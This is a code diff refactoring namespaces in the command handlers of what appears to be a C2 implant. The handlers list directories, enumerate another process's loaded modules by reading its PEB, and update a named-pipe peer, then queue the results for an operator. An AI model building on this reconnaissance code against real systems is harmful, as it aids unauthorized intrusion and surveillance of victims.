@@ -1,15 +1,10 @@
 #include <core/include/commands.hpp>
-using namespace Stream;
-using namespace Parser;
-using namespace Message;
-using namespace Process;
-
 namespace Commands {
 
     VOID DirectoryList (PPARSER Parser) {
         HEXANE
 
-        PSTREAM Outbound          = CreateStreamWithHeaders(TypeTasking);
+        PSTREAM Outbound          = Stream::CreateStreamWithHeaders(TypeTasking);
         ULONG PathSize          = { };
         CHAR Path[MAX_PATH]     = { };
 
@@ -20,7 +15,7 @@ namespace Commands {
         SYSTEMTIME FileTime     = { };
         SYSTEMTIME SysTime      = { };
 
-        PackDword(Outbound, CommandDir);
+        Stream::PackDword(Outbound, CommandDir);
 
         if ((B_PTR(Parser->Handle))[0] == (BYTE)PERIOD) {
             if (!(PathSize = Ctx->win32.GetCurrentDirectoryA(MAX_PATH * 2, Path))) {
@@ -35,7 +30,7 @@ namespace Commands {
             Path[PathSize]    = NULTERM;
         }
 
-        if ((File = Ctx->win32.FindFirstFileA(UnpackString(Parser, nullptr), &Next)) == INVALID_HANDLE_VALUE) {
+        if ((File = Ctx->win32.FindFirstFileA(Parser::UnpackString(Parser, nullptr), &Next)) == INVALID_HANDLE_VALUE) {
             return_defer(ERROR_FILE_NOT_FOUND);
         }
 
@@ -47,31 +42,31 @@ namespace Commands {
             }
 
             if (Next.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                PackBool(Outbound, TRUE);
+                Stream::PackBool(Outbound, TRUE);
 
             } else {
                 FileSize.HighPart   = Next.nFileSizeHigh;
                 FileSize.LowPart    = Next.nFileSizeLow;
 
-                PackBool(Outbound, FALSE);
-                PackDword64(Outbound, FileSize.QuadPart);
+                Stream::PackBool(Outbound, FALSE);
+                Stream::PackDword64(Outbound, FileSize.QuadPart);
             }
 
-            PackDword(Outbound, FileTime.wDay);
-            PackDword(Outbound, FileTime.wMonth);
-            PackDword(Outbound, FileTime.wYear);
-            PackDword(Outbound, SysTime.wSecond);
-            PackDword(Outbound, SysTime.wMinute);
-            PackDword(Outbound, SysTime.wHour);
-            PackString(Outbound, Next.cFileName);
+            Stream::PackDword(Outbound, FileTime.wDay);
+            Stream::PackDword(Outbound, FileTime.wMonth);
+            Stream::PackDword(Outbound, FileTime.wYear);
+            Stream::PackDword(Outbound, SysTime.wSecond);
+            Stream::PackDword(Outbound, SysTime.wMinute);
+            Stream::PackDword(Outbound, SysTime.wHour);
+            Stream::PackString(Outbound, Next.cFileName);
 
             Counter++;
 
         } while (Ctx->win32.FindNextFileA(File, &Next) != 0);
 
-        OutboundQueue(Outbound);
-
+        Message::OutboundQueue(Outbound);
         defer:
+
         if (File) {
             Ctx->win32.FindClose(File);
         }
@@ -80,7 +75,7 @@ namespace Commands {
     VOID ProcessModules (PPARSER Parser) {
         HEXANE
 
-        PSTREAM Outbound                  = CreateStreamWithHeaders(TypeTasking);
+        PSTREAM Outbound                  = Stream::CreateStreamWithHeaders(TypeTasking);
         PPEB_LDR_DATA LdrData           = { };
         PROCESS_BASIC_INFORMATION pbi   = { };
         HANDLE Process                  = { };
@@ -96,11 +91,11 @@ namespace Commands {
         INT counter = 0;
         SIZE_T size = 0;
 
-        PackDword(Outbound, CommandMods);
+        Stream::PackDword(Outbound, CommandMods);
 
         if (
-            !(Pid       = GetProcessIdByName(S_PTR(Parser->Handle))) ||
-            !(Process   = NtOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, Pid))) {
+            !(Pid       = Process::GetProcessIdByName(S_PTR(Parser->Handle))) ||
+            !(Process   = Process::NtOpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, Pid))) {
             return_defer(ERROR_PROCESS_IS_PROTECTED);
         }
 
@@ -124,10 +119,11 @@ namespace Commands {
                 if (cMod.FullDllName.Length > 0) {
                     size = x_wcstombs(ModNameA, ModNameW, cMod.FullDllName.Length);
 
-                    PackString(Outbound, ModNameA);
-                    PackDword64(Outbound, U64(cMod.DllBase));
+                    Stream::PackString(Outbound, ModNameA);
+                    Stream::PackDword64(Outbound, U64(cMod.DllBase));
                     counter++;
                 }
+
                 x_memset(ModNameW, 0, MAX_PATH);
                 x_memset(ModNameA, 0, MAX_PATH);
 
@@ -135,7 +131,7 @@ namespace Commands {
             }
         }
 
-        OutboundQueue(Outbound);
+        Message::OutboundQueue(Outbound);
 
         defer:
         return;
@@ -153,7 +149,6 @@ namespace Commands {
     VOID UpdatePeer(PPARSER Parser) {
         HEXANE
 
-        ParserWcscpy(Parser, &Ctx->Config.IngressPipename);
+        Parser::ParserWcscpy(Parser, &Ctx->Config.IngressPipename);
     }
-
 }
